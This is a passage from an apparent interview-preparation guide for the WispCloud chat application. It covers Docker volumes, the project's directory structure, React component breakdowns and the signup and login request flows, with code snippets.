  mongodb_data:  # Stored in /var/lib/docker/volumes/
```

2. **Bind Mounts** (specific host path)
```yaml
volumes:
  - ./backend/src:/app/src  # Host path:Container path
```

**When to use each:**

| Volume Type | Use Case |
|-------------|----------|
| Named volume | Persist database data |
| Bind mount | Hot-reload source code in dev |
| Anonymous volume | Prevent node_modules conflicts |

### Common Interview Questions

**Q1: What's the difference between CMD and ENTRYPOINT?**

**A:**
- `CMD`: Default command, can be overridden
- `ENTRYPOINT`: Always runs, CMD becomes arguments

```dockerfile
# Example 1
CMD ["node", "index.js"]
# docker run myapp → runs: node index.js
# docker run myapp npm test → runs: npm test (CMD overridden)

# Example 2
ENTRYPOINT ["node"]
CMD ["index.js"]
# docker run myapp → runs: node index.js
# docker run myapp server.js → runs: node server.js
```

**Q2: How does Docker networking work?**

**A:** Docker creates virtual networks:
- Bridge network: Default, containers on same network can communicate
- Host network: Container uses host's network stack (no isolation)
- Service names become DNS hostnames (mongodb, redis, etc.)

**Q3: Why use multi-stage builds?**

**A:**
1. Smaller images (exclude dev dependencies)
2. Security (separate build and runtime environments)
3. Single Dockerfile for dev and prod

**Q4: What happens to data when you delete a container?**

**A:**
- Without volumes: Data is lost
- With volumes: Data persists (stored separately from container)

---

# CHAPTER 4: SYSTEM ARCHITECTURE

This chapter provides a comprehensive breakdown of WispCloud's architecture, from folder structure to component hierarchy and data flow patterns.

## 4.1 Project Structure & Organization

### Backend Architecture (Node.js/Express)

**Complete Directory Tree:**

```
backend/
├── src/
│   ├── config/              # Configuration files
│   │   └── passport.js      # Passport.js OAuth strategies
│   │
│   ├── controllers/         # Request handlers (business logic)
│   │   ├── analytics.controller.js
│   │   ├── auth.controller.js
│   │   ├── chatInvite.controllers.js
│   │   ├── group.controllers.js
│   │   ├── groupMessage.controllers.js
│   │   ├── message.controllers.js
│   │   ├── oauth.controller.js
│   │   └── user.controllers.js
│   │
│   ├── middleware/          # Express middleware
│   │   ├── auth.middleware.js       # JWT verification
│   │   ├── rbac.middleware.js       # Role-based access control
│   │   ├── rateLimiter.js           # Rate limiting (6 tiers)
│   │   └── validation.js            # Input validation schemas
│   │
│   ├── models/              # Mongoose schemas
│   │   ├── chatInvite.model.js      # Chat invitations
│   │   ├── concept.model.js         # NLP concepts (for recall)
│   │   ├── group.model.js           # Group metadata
│   │   ├── groupMember.model.js     # Group membership & permissions
│   │   ├── message.model.js         # Messages with NLP fields
│   │   └── user.model.js            # User accounts
│   │
│   ├── routes/              # API route definitions
│   │   ├── analytics.routes.js
│   │   ├── auth.route.js
│   │   ├── chatInvite.routes.js
│   │   ├── group.routes.js
│   │   ├── messageRoutes.js
│   │   ├── oauth.routes.js
│   │   └── user.routes.js
│   │
│   ├── lib/                 # Shared libraries/utilities
│   │   ├── cloudinary.js    # Image upload service
│   │   ├── db.js            # MongoDB connection
│   │   ├── redis.js         # Redis client & presence system (252 lines)
│   │   ├── socket.js        # Socket.IO server setup (175 lines)
│   │   └── utils.js         # Helper functions
│   │
│   ├── scripts/             # Utility scripts
│   │   └── seedUsers.js     # Database seeding
│   │
│   ├── seeds/               # Seed data
│   │   └── user.seeds.js
│   │
│   └── index.js             # Application entry point (172 lines)
│
├── Dockerfile               # Production container
├── Dockerfile.dev           # Development container
└── package.json             # Dependencies
```

**File Statistics:**
- Total Backend Files: 34 JavaScript files
- Total Lines of Code: ~8,500+ lines
- Controllers: 8 files (~2,100 lines)
- Models: 6 files (~650 lines)
- Middleware: 4 files (~350 lines)
- Core Libraries: 5 files (~850 lines)
- Routes: 7 files (~300 lines)

**Directory Purposes:**

1. **config/**: Application configuration
   - OAuth strategies (Google, etc.)
   - Environment-specific settings

2. **controllers/**: Business logic layer
   - Handle HTTP requests
   - Process data and responses
   - Interact with models
   - Return JSON responses

3. **middleware/**: Request processing pipeline
   - Authentication (JWT verification)
   - Authorization (RBAC)
   - Rate limiting (Redis-backed)
   - Input validation (Zod/Joi schemas)

4. **models/**: Data layer (MongoDB schemas)
   - Define database structure
   - Schema validation
   - Indexes for performance
   - Mongoose middleware (hooks)

5. **routes/**: API endpoint definitions
   - Map URLs to controllers
   - Apply middleware chains
   - Define HTTP methods

6. **lib/**: Shared utilities
   - Database connections
   - Third-party service clients
   - Socket.IO setup
   - Redis operations

### Frontend Architecture (React/Vite)

**Complete Directory Tree:**

```
frontend/Wisp/
├── src/
│   ├── components/          # React components
│   │   ├── skeletons/       # Loading skeletons
│   │   │   ├── MessageSkeleton.jsx
│   │   │   └── SidebarSkeleton.jsx
│   │   │
│   │   ├── AuthImagePattern.jsx     # Auth page background
│   │   ├── ChatContainer.jsx        # Main DM chat UI
│   │   ├── ChatHeader.jsx           # Chat top bar
│   │   ├── ChatInvites.jsx          # Invite notifications
│   │   ├── CreateGroupModal.jsx     # Group creation modal
│   │   ├── GroupChatContainer.jsx   # Group chat UI
│   │   ├── GroupDetailsModal.jsx    # Group settings modal
│   │   ├── GroupsSidebar.jsx        # Groups list
│   │   ├── MessageInput.jsx         # Message composer
│   │   ├── Navbar.jsx               # Top navigation
│   │   ├── NoChatSelected.jsx       # Empty state
│   │   ├── OAuthButtons.jsx         # Social login buttons
│   │   ├── Sidebar.jsx              # DM users list
│   │   └── UserSearchBar.jsx        # User search
│   │
│   ├── pages/               # Page components
│   │   ├── AnalyticsPage.jsx
│   │   ├── HomePage.jsx
│   │   ├── LoginPage.jsx
│   │   ├── OAuthSuccessPage.jsx
│   │   ├── ProfilePage.jsx
│   │   ├── SettingsPage.jsx
│   │   ├── SignUpPage.jsx
│   │   └── UserProfilePage.jsx
│   │
│   ├── store/               # Zustand state management
│   │   ├── useAuthStore.js          # Auth & Socket connection
│   │   ├── useChatInviteStore.js    # Invite management
│   │   ├── useChatStore.js          # DM messages
│   │   ├── useGroupStore.js         # Groups & group messages
│   │   ├── useThemeStore.js         # Theme preferences
│   │   └── useUserStore.js          # User data
│   │
│   ├── lib/                 # Frontend utilities
│   │   ├── axios.js         # Axios instance with interceptors
│   │   └── utils.js         # Helper functions
│   │
│   ├── constants/           # Constants
│   │   └── index.js         # App constants
│   │
│   ├── App.jsx              # Root component with routing
│   └── main.jsx             # Application entry point
│
├── public/                  # Static assets
├── index.html               # HTML template
├── vite.config.js           # Vite configuration
├── tailwind.config.js       # Tailwind CSS config
└── package.json             # Dependencies
```

**File Statistics:**
- Total Frontend Files: 35 JavaScript/JSX files
- Total Lines of Code: ~6,500+ lines
- Components: 18 files (~3,200 lines)
- Pages: 8 files (~1,800 lines)
- Stores: 6 files (~1,100 lines)
- Libraries: 2 files (~200 lines)

**Directory Purposes:**

1. **components/**: Reusable UI components
   - Chat interface components
   - Modals and overlays
   - Navigation elements
   - Loading states (skeletons)

2. **pages/**: Route-level components
   - Full page layouts
   - Compose multiple components
   - Handle page-specific logic

3. **store/**: Global state management (Zustand)
   - Authentication state
   - Chat messages
   - Groups
   - UI state
   - WebSocket integration

4. **lib/**: Shared utilities
   - HTTP client configuration
   - Date formatting
   - Utility functions

### Monorepo Structure with Docker Compose

**Project Root:**

```
WispCloud/
├── backend/                 # Node.js Express backend
├── frontend/Wisp/           # React Vite frontend
├── docker-compose.yml       # Development orchestration
├── docker-compose.prod.yml  # Production orchestration
└── README.md
```

**Docker Compose Services:**

```yaml
services:
  mongodb:      # Database (port 27017)
  redis:        # Cache & presence (port 6379)
  backend:      # Node.js API (port 5001)
  frontend:     # React app (port 5173)
```

**Why This Structure?**

1. **Separation of Concerns**: Frontend and backend are independent
2. **Scalability**: Services can scale independently
3. **Development**: Hot-reload for both frontend and backend
4. **Production**: Multi-stage builds for optimization
5. **Portability**: Same structure works locally and in production

### Key Configuration Files

**Backend package.json Dependencies:**
```json
{
  "express": "^4.18.2",           // Web framework
  "mongoose": "^8.0.0",           // MongoDB ODM
  "socket.io": "^4.6.0",          // WebSocket library
  "redis": "^4.6.0",              // Redis client
  "jsonwebtoken": "^9.0.2",       // JWT auth
  "bcryptjs": "^2.4.3",           // Password hashing
  "cloudinary": "^1.41.0",        // Image uploads
  "passport": "^0.7.0",           // OAuth authentication
  "express-rate-limit": "^7.1.0", // Rate limiting
  "helmet": "^7.1.0",             // Security headers
  "cors": "^2.8.5"                // CORS handling
}
```

**Frontend package.json Dependencies:**
```json
{
  "react": "^18.2.0",             // UI library
  "react-router-dom": "^6.20.0",  // Routing
  "zustand": "^4.4.7",            // State management
  "socket.io-client": "^4.6.0",   // WebSocket client
  "axios": "^1.6.0",              // HTTP client
  "react-hot-toast": "^2.4.1",    // Notifications
  "lucide-react": "^0.294.0",     // Icons
  "daisyui": "^4.4.0",            // Component library
  "tailwindcss": "^3.3.6"         // CSS framework
}
```

> **Interview Tip:** Be ready to explain why you chose each technology:
> - Express: Minimalist, flexible, large ecosystem
> - Socket.IO: Reliable real-time communication with fallbacks
> - Redis: In-memory speed for presence/caching
> - Zustand: Simpler than Redux, no boilerplate
> - Tailwind: Utility-first CSS, consistent design system

---

## 4.2 Component Breakdown

### All 18 React Components

#### Navigation & Layout Components

**1. Navbar** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\Navbar.jsx)
- **Purpose**: Top navigation bar with branding and user actions
- **Props**: None (uses global auth store)
- **State**: None (stateless)
- **Features**:
  - Branding (Wisp logo)
  - Settings link
  - Analytics link (admin only)
  - Profile link
  - Logout button
- **Key Code**:
```jsx
const Navbar = () => {
  const { logout, authUser } = useAuthStore();

  return (
    <header className="fixed w-full top-0 z-40 backdrop-blur-lg">
      <Link to="/">
        <MessageSquare /> Wisp
      </Link>
      {authUser?.role === "admin" && (
        <Link to="/analytics">Analytics</Link>
      )}
      <button onClick={logout}>Logout</button>
    </header>
  );
};
```

**2. Sidebar** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\Sidebar.jsx)
- **Purpose**: Left sidebar showing DM contacts
- **Props**: None
- **State**:
  - `showOnlineOnly`: boolean (filter toggle)
- **Features**:
  - Lists all contacts (from accepted invites)
  - Shows online status (green dot)
  - Filters online users
  - Click to select user
  - Integrates with ChatInvites component
- **Data Flow**:
  - Fetches `users` from `useChatStore`
  - Filters by `onlineUsers` from `useAuthStore`
  - Updates `selectedUser` on click

**3. GroupsSidebar** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\GroupsSidebar.jsx)
- **Purpose**: Right sidebar showing user's groups
- **Props**: None
- **State**:
  - `isCreateModalOpen`: boolean
- **Features**:
  - Lists all groups user is member of
  - Shows group avatar/name
  - Create new group button
  - Click to select group
  - Shows member count
- **Data Flow**:
  - Fetches `groups` from `useGroupStore`
  - Opens CreateGroupModal
  - Updates `selectedGroup` on click

#### Chat Components

**4. ChatContainer** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\ChatContainer.jsx)
- **Purpose**: Main DM chat interface
- **Props**: None (uses selected user from store)
- **State**:
  - `searchQuery`: string (message search)
  - `isSearchOpen`: boolean
  - `replyingTo`: message object
- **Features**:
  - Displays message history
  - Scrolls to latest message
  - Search messages by text
  - Reply to messages
  - Shows read receipts
  - Real-time updates via Socket.IO
- **Key Structure**:
```jsx
const ChatContainer = () => {
  const { messages, getMessages, subscribeToMessages,
          unsubscribeFromMessages, markMessagesAsRead } = useChatStore();
  const { authUser } = useAuthStore();

  useEffect(() => {
    getMessages(selectedUser._id);
    subscribeToMessages();
    markMessagesAsRead(selectedUser._id);
    return () => unsubscribeFromMessages();
  }, [selectedUser._id]);

  return (
    <div className="flex-1 flex flex-col">
      <ChatHeader />
      <div className="flex-1 overflow-y-auto p-4">
        {messages.map(msg => (
          <MessageBubble key={msg._id} message={msg} />
        ))}
      </div>
      <MessageInput replyingTo={replyingTo} />
    </div>
  );
};
```

**5. GroupChatContainer** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\GroupChatContainer.jsx)
- **Purpose**: Group chat interface (similar to ChatContainer but for groups)
- **Props**: None (uses selected group from store)
- **State**: Similar to ChatContainer
- **Features**:
  - Group message history
  - Shows sender name/avatar for each message
  - Real-time group messages
  - Group typing indicators
  - Permission-based message sending
- **Differences from ChatContainer**:
  - Shows sender info on all messages (not just others)
  - Checks `canSendMessages` permission
  - Uses `subscribeToGroupMessages` instead of `subscribeToMessages`
  - Emits `groupTyping` events

**6. ChatHeader** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\ChatHeader.jsx)
- **Purpose**: Top bar of chat showing user info and actions
- **Props**:
  - `onSearchChange`: function
  - `isSearchOpen`: boolean
  - `setIsSearchOpen`: function
- **Features**:
  - Shows selected user avatar/name
  - Online status indicator
  - Search toggle button
  - Profile link
  - Video call button (future)
- **Key Code**:
```jsx
const ChatHeader = ({ onSearchChange, isSearchOpen, setIsSearchOpen }) => {
  const { selectedUser } = useChatStore();
  const { onlineUsers } = useAuthStore();

  const isOnline = onlineUsers.includes(selectedUser._id);

  return (
    <div className="border-b p-4 flex items-center justify-between">
      <div className="flex items-center gap-3">
        <Avatar user={selectedUser} online={isOnline} />
        <div>
          <h3>{selectedUser.fullName}</h3>
          <span>{isOnline ? "Online" : "Offline"}</span>
        </div>
      </div>
      <button onClick={() => setIsSearchOpen(!isSearchOpen)}>
        <Search />
      </button>
    </div>
  );
};
```

**7. MessageInput** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\MessageInput.jsx)
- **Purpose**: Message composer with text, image, and reply support
- **Props**:
  - `replyingTo`: message object (optional)
  - `onCancelReply`: function
- **State**:
  - `text`: string (message text)
  - `imagePreview`: string (base64 image)
- **Features**:
  - Text input with Enter to send
  - Image upload with preview
  - Reply UI with quoted message
  - Emoji picker (optional)
  - Typing indicators
  - Send button
- **Key Features**:
```jsx
const MessageInput = ({ replyingTo, onCancelReply }) => {
  const [text, setText] = useState("");
  const [imagePreview, setImagePreview] = useState(null);
  const { sendMessage } = useChatStore();
  const { socket } = useAuthStore();

  const handleSend = async () => {
    await sendMessage({
      text,
      image: imagePreview,
      replyTo: replyingTo?._id
    });
    setText("");
    setImagePreview(null);
    onCancelReply();
  };

  const handleTyping = (isTyping) => {
    socket.emit("typing", {
      receiverId: selectedUser._id,
      isTyping
    });
  };

  return (
    <div className="border-t p-4">
      {replyingTo && (
        <div className="mb-2 bg-base-200 p-2 rounded">
          Replying to: {replyingTo.text}
          <button onClick={onCancelReply}>Cancel</button>
        </div>
      )}
      <div className="flex gap-2">
        <input
          value={text}
          onChange={(e) => setText(e.target.value)}
          onFocus={() => handleTyping(true)}
          onBlur={() => handleTyping(false)}
          onKeyPress={(e) => e.key === 'Enter' && handleSend()}
        />
        <ImageUpload onChange={setImagePreview} />
        <button onClick={handleSend}>Send</button>
      </div>
    </div>
  );
};
```

#### Modal Components

**8. CreateGroupModal** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\CreateGroupModal.jsx)
- **Purpose**: Modal for creating new groups
- **Props**:
  - `isOpen`: boolean
  - `onClose`: function
- **State**:
  - `groupName`: string
  - `description`: string
  - `groupImage`: string (base64)
  - `selectedParticipants`: array of user IDs
  - `searchQuery`: string
  - `isSubmitting`: boolean
- **Features**:
  - Group name input (3-30 chars)
  - Description textarea
  - Image upload with preview
  - User search and selection
  - Multi-select participants (checkboxes)
  - Validation before submit
  - Duplicate submission prevention
- **Key Implementation**:
```jsx
const CreateGroupModal = ({ isOpen, onClose }) => {
  const [groupName, setGroupName] = useState("");
  const [selectedParticipants, setSelectedParticipants] = useState([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const submittingRef = useRef(false);

  const { createGroup, addMembers } = useGroupStore();
  const { users, getUsers } = useChatStore();

  useEffect(() => {
    if (isOpen && users.length === 0) {
      getUsers();
    }
  }, [isOpen]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    e.stopPropagation();

    // Prevent duplicate submissions
    if (isSubmitting || submittingRef.current) return;

    if (!groupName.trim() || selectedParticipants.length === 0) {
      toast.error("Name and participants required");
      return;
    }

    submittingRef.current = true;
    setIsSubmitting(true);

    try {
      const group = await createGroup({
        name: groupName,
        description,
        groupImage
      });

      await addMembers(group._id, selectedParticipants);

      toast.success("Group created!");
      onClose();
      resetForm();
    } catch (error) {
      console.error(error);
    } finally {
      setIsSubmitting(false);
      submittingRef.current = false;
    }
  };

  return (
    <dialog open={isOpen}>
      <form onSubmit={handleSubmit}>
        <input value={groupName} onChange={e => setGroupName(e.target.value)} />
        <textarea value={description} onChange={e => setDescription(e.target.value)} />

        <div className="max-h-96 overflow-y-auto">
          {users.map(user => (
            <label key={user._id}>
              <input
                type="checkbox"
                checked={selectedParticipants.includes(user._id)}
                onChange={() => toggleParticipant(user._id)}
              />
              {user.fullName}
            </label>
          ))}
        </div>

        <button type="submit" disabled={isSubmitting}>
          {isSubmitting ? "Creating..." : "Create Group"}
        </button>
      </form>
    </dialog>
  );
};
```

**9. GroupDetailsModal** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\GroupDetailsModal.jsx)
- **Purpose**: View and manage group settings
- **Props**:
  - `isOpen`: boolean
  - `onClose`: function
  - `group`: group object
- **State**:
  - `members`: array
  - `isEditing`: boolean
  - `editedName`: string
  - `editedDescription`: string
- **Features**:
  - View group details
  - Edit name/description (if permission)
  - View member list with roles
  - Add/remove members (if permission)
  - Change member roles (if owner)
  - Leave group
  - Delete group (if owner)

#### Utility Components

**10. ChatInvites** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\ChatInvites.jsx)
- **Purpose**: Display pending chat invitations
- **Props**: None
- **Features**:
  - Shows pending invites
  - Accept/Reject buttons
  - Real-time updates
  - Toast notifications
- **Integration**: Embedded in Sidebar component

**11. UserSearchBar** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\UserSearchBar.jsx)
- **Purpose**: Search and send invites to users
- **Props**: None
- **State**:
  - `searchQuery`: string
  - `searchResults`: array
  - `isSearching`: boolean
- **Features**:
  - Search users by username/email
  - Show results
  - Send invite button
  - Debounced search

**12. OAuthButtons** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\OAuthButtons.jsx)
- **Purpose**: Social login buttons
- **Props**: None
- **Features**:
  - Google Sign-In button
  - GitHub button (future)
  - Redirects to OAuth flow

**13. NoChatSelected** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\NoChatSelected.jsx)
- **Purpose**: Empty state when no chat is selected
- **Props**: None
- **Features**:
  - Welcome message
  - Instructions
  - Illustration/icon

**14. AuthImagePattern** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\AuthImagePattern.jsx)
- **Purpose**: Decorative background for auth pages
- **Props**:
  - `title`: string
  - `subtitle`: string
- **Features**:
  - Grid pattern background
  - Animated gradients
  - Responsive design

#### Skeleton Loaders

**15. MessageSkeleton** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\skeletons\MessageSkeleton.jsx)
- **Purpose**: Loading state for messages
- **Features**:
  - Animated pulse effect
  - Multiple skeleton bubbles
  - Mimics message layout

**16. SidebarSkeleton** (C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\components\skeletons\SidebarSkeleton.jsx)
- **Purpose**: Loading state for sidebar
- **Features**:
  - Multiple user item skeletons
  - Avatar placeholders
  - Text line skeletons

### Component Hierarchy & Data Flow

```
App (Root)
├── Navbar
│   └── useAuthStore (logout, authUser)
│
├── HomePage
│   ├── Sidebar
│   │   ├── ChatInvites
│   │   │   └── useChatInviteStore
│   │   ├── UserSearchBar
│   │   │   └── useUserStore
│   │   └── useChatStore (users, selectedUser)
│   │
│   ├── ChatContainer / NoChatSelected
│   │   ├── ChatHeader
│   │   ├── Messages (map)
│   │   ├── MessageInput
│   │   └── useChatStore (messages, sendMessage)
│   │
│   └── GroupsSidebar
│       ├── CreateGroupModal
│       │   └── useGroupStore (createGroup)
│       └── useGroupStore (groups, selectedGroup)
│
├── LoginPage
│   ├── AuthImagePattern
│   ├── OAuthButtons
│   └── useAuthStore (login)
│
├── SignUpPage
│   ├── AuthImagePattern
│   ├── OAuthButtons
│   └── useAuthStore (signup)
│
├── ProfilePage
│   └── useAuthStore (authUser, updateProfile)
│
├── SettingsPage
│   └── useThemeStore
│
└── AnalyticsPage (Admin only)
    └── useAuthStore (authUser.role)
```

**Data Flow Pattern:**

1. **Top-Down Props**: Parent → Child
   ```
   HomePage → ChatContainer → MessageInput
   (replyingTo prop passed down)
   ```

2. **Global State (Zustand)**: Any component can access
   ```
   useAuthStore: Authentication, Socket, OnlineUsers
   useChatStore: DM messages, Users
   useGroupStore: Groups, Group messages
   ```

3. **Socket.IO Events**: Real-time updates
   ```
   Backend emits → Socket.IO → useAuthStore.socket → useChatStore subscribes
   ```

4. **HTTP Requests**: API calls
   ```
   Component → Store action → axiosInstance → Backend → Response → Store update → Component re-render
   ```

### Props & State for Major Components

#### ChatContainer

**Props**: None (uses Zustand stores)

**Local State**:
```javascript
const [searchQuery, setSearchQuery] = useState("");
const [isSearchOpen, setIsSearchOpen] = useState(false);
const [replyingTo, setReplyingTo] = useState(null);
```

**Store State** (from useChatStore):
```javascript
{
  messages: Message[],           // All messages in conversation
  selectedUser: User,            // Current chat partner
  isMessagesLoading: boolean,    // Loading indicator
  getMessages: (userId) => {},   // Fetch messages
  sendMessage: (data) => {},     // Send new message
  subscribeToMessages: () => {}, // Listen for real-time updates
  unsubscribeFromMessages: () => {}, // Cleanup
  markMessagesAsRead: (userId) => {} // Mark as read
}
```

**Lifecycle**:
```javascript
useEffect(() => {
  // When selectedUser changes:
  getMessages(selectedUser._id);      // 1. Fetch message history
  subscribeToMessages();              // 2. Subscribe to real-time updates
  markMessagesAsRead(selectedUser._id); // 3. Mark as read

  return () => unsubscribeFromMessages(); // 4. Cleanup on unmount
}, [selectedUser._id]);
```

#### CreateGroupModal

**Props**:
```javascript
{
  isOpen: boolean,      // Control visibility
  onClose: () => void   // Close callback
}
```

**Local State**:
```javascript
const [groupName, setGroupName] = useState("");
const [description, setDescription] = useState("");
const [groupImage, setGroupImage] = useState(null);
const [imagePreview, setImagePreview] = useState(null);
const [selectedParticipants, setSelectedParticipants] = useState([]);
const [searchQuery, setSearchQuery] = useState("");
const [isSubmitting, setIsSubmitting] = useState(false);
```

**Store State** (from useGroupStore):
```javascript
{
  createGroup: (data) => {},        // Create group API call
  addMembers: (groupId, userIds) => {} // Add members API call
}
```

**Store State** (from useChatStore):
```javascript
{
  users: User[],           // Available contacts to add
  getUsers: () => {},      // Fetch contacts
  isUsersLoading: boolean  // Loading state
}
```

#### MessageInput

**Props**:
```javascript
{
  replyingTo: Message | null,      // Message being replied to
  onCancelReply: () => void        // Cancel reply callback
}
```

**Local State**:
```javascript
const [text, setText] = useState("");
const [imagePreview, setImagePreview] = useState(null);
```

**Store State**:
```javascript
{
  sendMessage: (messageData) => {},  // from useChatStore
  selectedUser: User,                // from useChatStore
  socket: Socket                     // from useAuthStore
}
```

> **Interview Tip:** Explain the choice between props, local state, and global state:
> - **Props**: For component composition and reusability (e.g., replyingTo)
> - **Local State**: For UI-only state that doesn't need to be shared (e.g., text input)
> - **Global State**: For data needed across multiple components (e.g., messages, auth)
> - **Zustand over Redux**: Less boilerplate, simpler API, better TypeScript support

---

## 4.3 Data Flow & Request Lifecycle

This section traces complete request flows from button click to UI update, showing every step through the stack.

### 1. User Signup Flow (20 Steps)

**Frontend to Backend to Database to Response:**

```
Step 1: User fills form and clicks "Sign Up" button
  ↓ Location: SignUpPage.jsx
  ↓ Event: onClick handler

Step 2: Form validation (client-side)
  ↓ Checks: email format, password length ≥6, username 3-20 chars
  ↓ If invalid: Show error toast, STOP

Step 3: Call useAuthStore.signup()
  ↓ Location: frontend/Wisp/src/store/useAuthStore.js
  ↓ Code:
      const signup = async (data) => {
        set({ isSigningUp: true });
        try {
          const res = await axiosInstance.post("/auth/signup", data);
          set({ authUser: res.data });
          toast.success("Account created successfully");
          get().connectSocket();
        } catch (error) {
          toast.error(error.response.data.message);
        } finally {
          set({ isSigningUp: false });
        }
      };

Step 4: Axios POST request
  ↓ URL: http://localhost:5001/api/auth/signup
  ↓ Headers: { "Content-Type": "application/json" }
  ↓ Body: { fullName, email, password, username }
  ↓ axios interceptor adds withCredentials: true

Step 5: Request hits backend server
  ↓ Location: backend/src/index.js
  ↓ Middleware chain begins

Step 6: Helmet.js security headers
  ↓ Adds: CSP, HSTS, X-Frame-Options, etc.

Step 7: Body parsing middleware
  ↓ Parses JSON body → req.body
  ↓ Limit: 50mb

Step 8: CORS middleware
  ↓ Checks origin: http://localhost:5173
  ↓ Sets Access-Control-Allow-Origin header

Step 9: Global rate limiter
  ↓ Location: middleware/rateLimiter.js
  ↓ Check: 1000 req/15min (dev) or 500 req/15min (prod)
  ↓ If exceeded: 429 Too Many Requests, STOP

Step 10: Route matching
  ↓ Location: routes/auth.route.js
  ↓ Matches: POST /api/auth/signup
  ↓ Route definition:
      router.post("/signup",
        authLimiter,           // Rate limit: 100 req/15min (dev)
        validate(signupSchema), // Zod validation
        signup                 // Controller
      );

Step 11: Auth rate limiter (second layer)
  ↓ More strict: 100 requests/15min (dev), 20/15min (prod)
  ↓ Uses Redis if available, memory store as fallback

Step 12: Validation middleware
  ↓ Location: middleware/validation.js
  ↓ Validates with Zod schema:
      signupSchema = z.object({
        email: z.string().email(),
        password: z.string().min(6),
        username: z.string().min(3).max(20),
        fullName: z.string().min(1)
      });
  ↓ If invalid: 400 Bad Request with details, STOP

Step 13: Controller execution
  ↓ Location: controllers/auth.controller.js
  ↓ Function: signup
  ↓ Code:
      export const signup = async (req, res) => {
        const { fullName, email, password, username } = req.body;

        // Validate all fields present
        if (!fullName || !email || !password || !username) {
          return res.status(400).json({ message: "All fields required" });
        }

        // Check existing user
        const existingUser = await User.findOne({
          $or: [{ email }, { username }]
        });

        if (existingUser) {
          if (existingUser.email === email) {
            return res.status(400).json({ message: "Email already exists" });
          }
          if (existingUser.username === username) {
            return res.status(400).json({ message: "Username already taken" });
          }
        }

        // Hash password
        const salt = await bcrypt.genSalt(10);
        const hashPassword = await bcrypt.hash(password, salt);

        // Create user
        const newUser = new User({
          fullName,
          email,
          username,
          password: hashPassword
        });

        if (newUser) {
          generateToken(newUser._id, res);
          await newUser.save();

          res.status(201).json({
            _id: newUser._id,
            fullName: newUser.fullName,
            email: newUser.email,
            username: newUser.username,
            profilePic: newUser.profilePic
          });
        } else {
          res.status(400).json({ message: "Invalid user data" });
        }
      };

Step 14: Database query - Check existing user
  ↓ Query: User.findOne({ $or: [{ email }, { username }] })
  ↓ Uses indexes on email and username fields
  ↓ If found: Return 400, STOP

Step 15: Hash password with bcrypt
  ↓ Generate salt (10 rounds)
  ↓ Hash: bcrypt.hash(password, salt)
  ↓ Time: ~100-200ms (intentionally slow for security)

Step 16: Generate JWT token
  ↓ Location: lib/utils.js
  ↓ Code:
      export const generateToken = (userId, res) => {
        const token = jwt.sign({ userId }, process.env.JWT_SECRET, {
          expiresIn: "7d"
        });

        res.cookie("jwt", token, {
          maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
          httpOnly: true,  // XSS protection
          sameSite: "strict", // CSRF protection
          secure: process.env.NODE_ENV === "production" // HTTPS only in prod
        });

        return token;
      };

Step 17: Save user to database
  ↓ Query: newUser.save()
  ↓ MongoDB inserts document
  ↓ Triggers: Mongoose middleware (if any)
  ↓ Returns: Saved document with _id

Step 18: Send response
  ↓ Status: 201 Created
  ↓ Headers: Set-Cookie: jwt=<token>
  ↓ Body: { _id, fullName, email, username, profilePic }

Step 19: Frontend receives response
  ↓ Location: useAuthStore.signup()
  ↓ Updates state: set({ authUser: res.data })
  ↓ Calls: get().connectSocket()

Step 20: Connect Socket.IO
  ↓ Location: useAuthStore.connectSocket()
  ↓ Creates WebSocket connection
  ↓ Sends userId in query params
  ↓ Backend updates Redis: setUserOnline(userId)
  ↓ Emits: "getOnlineUsers" event to all clients
  ↓ UI updates: User is now logged in, redirected to HomePage
```

**Time Breakdown:**
- Client validation: <1ms
- Network latency: 10-50ms (local), 100-500ms (internet)
- Rate limiting: <1ms (Redis) or <5ms (memory)
- Database query (existing user): 5-20ms (with index)
- Password hashing: 100-200ms (bcrypt intentional)
- Database insert: 10-50ms
- JWT generation: <1ms
- Total: ~150-350ms (local), ~250-750ms (internet)

### 2. User Login Flow (15 Steps)

```
Step 1: User enters email/password and clicks "Login"
  ↓ Location: LoginPage.jsx

Step 2: Client-side validation
  ↓ Checks: email format, password not empty

Step 3: Call useAuthStore.login()
  ↓ Code:
      const login = async (data) => {
        set({ isLoggingIn: true });
        try {
          const res = await axiosInstance.post("/auth/login", data);
          set({ authUser: res.data });
          toast.success("Logged in successfully");
          get().connectSocket();
        } catch (error) {
          toast.error(error.response.data.message);
        } finally {
          set({ isLoggingIn: false });
        }
      };

Step 4: Axios POST to /api/auth/login
  ↓ Body: { email, password }

Step 5: Backend middleware chain
  ↓ Helmet → Body parser → CORS → Global rate limiter

Step 6: Route matching
  ↓ POST /api/auth/login
  ↓ Middleware: authLimiter, validate(loginSchema)

Step 7: Auth rate limiter
  ↓ 100 requests/15min (dev), 20/15min (prod)
  ↓ Prevents brute force attacks

Step 8: Validation middleware
  ↓ Schema: { email: string, password: string }

Step 9: Login controller
  ↓ Location: controllers/auth.controller.js
  ↓ Code:
      export const login = async (req, res) => {
        const { email, password } = req.body;

        // Find user (include password field)
        const user = await User.findOne({ email }).select("+password");

        if (!user) {
          return res.status(400).json({ message: "Invalid credentials" });
        }

        // Compare password
        const isPasswordCorrect = await bcrypt.compare(password, user.password);

        if (!isPasswordCorrect) {
          return res.status(400).json({ message: "Invalid credentials" });
        }

        // Generate JWT
        generateToken(user._id, res);

        // Return user data (without password)
        res.status(200).json({
